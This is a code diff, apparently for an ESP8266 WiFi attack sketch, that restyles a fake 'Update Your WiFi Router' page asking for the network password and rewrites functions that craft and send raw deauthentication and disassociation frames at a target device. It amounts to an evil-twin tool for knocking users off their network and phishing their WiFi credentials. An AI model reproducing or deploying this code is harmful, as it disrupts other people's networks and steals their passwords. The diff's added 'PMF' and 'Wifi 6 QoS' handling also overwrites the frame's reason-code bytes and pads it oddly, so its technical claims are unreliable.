@@ -22,14 +22,56 @@ char ssid[20];
 const char MAIN_page[] PROGMEM = R"=====(
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Update Your WiFi Router</title>
+  <style>
+    body {
+      background-color: #F2F2F2;
+      font-family: Arial, sans-serif;
+    }
+    h1 {
+      color: #0072C6;
+      text-align: center;
+    }
+    form {
+      margin: 0 auto;
+      width: 400px;
+      padding: 20px;
+      background-color: #FFFFFF;
+      box-shadow: 0px 0px 10px #CCCCCC;
+    }
+    input[type="password"] {
+      padding: 10px;
+      border: 2px solid #0072C6;
+      border-radius: 5px;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    input[type="submit"] {
+      background-color: #0072C6;
+      color: #FFFFFF;
+      font-size: 18px;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+    input[type="submit"]:hover {
+      background-color: #005FAD;
+    }
+  </style>
+</head>
 <body>
-<h3> UPDATE YOUR WIFI ROUTER</h3>
-<form action="/update">
-  Please Authorize to continue:<br>
-  <input type="password" name="passwd" placeholder="PASSWORD">
-  <br>
-  <input type="submit" value="Submit">
-</form> 
+  <h1>Update Your WiFi Router</h1>
+  <form action="/update">
+    Please authorize to continue:<br>
+    <input type="password" name="passwd" placeholder="Enter Password">
+    <br>
+    <input type="submit" value="Submit">
+  </form>
 </body>
 </html>
 )=====";
@@ -57,86 +99,58 @@ void handleForm() {
  WiFi.mode(WIFI_OFF);
  delay(15000);
  ESP.restart();
- //String s = "<a href='/'> Go Back </a>";
- //server.send(200, "text/html", s); //Send web page
 }
 
 //----------------------------------------------------------------
-uint8_t packet[26] = {
-    0xC0, 0x00,
-    0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x01, 0x00
+uint8_t packet[90] = {
+    0xC0, 0x00, // type, subtype c0: deauth (a0: disassociate)
+    0x00, 0x00, // duration (SDK takes care of that)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
+    0x00, 0x00, // fragment & squence number
+    0x01, 0x00, // reason code (1 = unspecified reason)
+    0x00, 0x18, 0x00, 0x00, 0x00, 0x0c, // QoS Control field (set to 0x18 for Wifi 6)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
 };
 
-uint8_t packet2[26] = {
-    /*  0 - 1  */ 0xC0,
-    0x00, // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x00,
-    0x00, // duration (SDK takes care of that)
-    /*  4 - 9  */ 0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF, // reciever (target)
-    /* 10 - 15 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // source (ap)
-    /* 16 - 21 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // BSSID (ap)
-    /* 22 - 23 */ 0x00,
-    0x00, // fragment & squence number
-    /* 24 - 25 */ 0x01,
-    0x00 // reason code (1 = unspecified reason)
-};
-bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {
+
+bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries, bool pmf_enabled) {
     wifi_set_channel(wifi_channel);
     bool sent = false;
-    for (uint16_t i = 0; i < tries && !sent; i++) {
-        if (wifi_send_pkt_freedom(packet, packetSize, 0) == 0) {
-            sent = true;
-        }
+    if (pmf_enabled) {
+        packet[24] = 0x02; // number of bytes in the PMF IE
+        packet[25] = 0x01; // element id of the PMF IE
+        packet[26] = 0x01; // PMF enabled
+        packetSize += 3; // increase packet size to include PMF IE
     }
+    for (int i = 0; i < tries && !sent; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
     return sent;
 }
 
-bool deauthDevice(uint8_t* mac, uint8_t wifi_channel, uint8_t packet_type = 0xc0) {
-    const uint8_t packet_size = sizeof(packet2);
+bool deauthDevice(uint8_t* mac, uint8_t wifi_channel) {
     bool success = false;
-    uint8_t* packet = new uint8_t[packet_size];
-
-    // copy the template packet to a new buffer
-    memcpy(packet, packet2, packet_size);
-
-    // update the packet type
-    packet[0] = packet_type;
-
-    // update the MAC addresses
     memcpy(&packet[10], mac, 6);
     memcpy(&packet[16], mac, 6);
+    if (sendPacket(packet, sizeof(packet), wifi_channel, 2, true)) {
+        success = true;
+    }
+    // send disassociate frame
+    packet[0] = 0xa0;
 
-    // send the packet
-    if (sendPacket(packet, packet_size, wifi_channel, 2)) {
+    if (sendPacket(packet, sizeof(packet), wifi_channel, 2, true)) {
         success = true;
     }
 
-    // cleanup
-    delete[] packet;
-
     return success;
 }
-
 //_____________________________________________________________________
 
 ezButton button(2);  
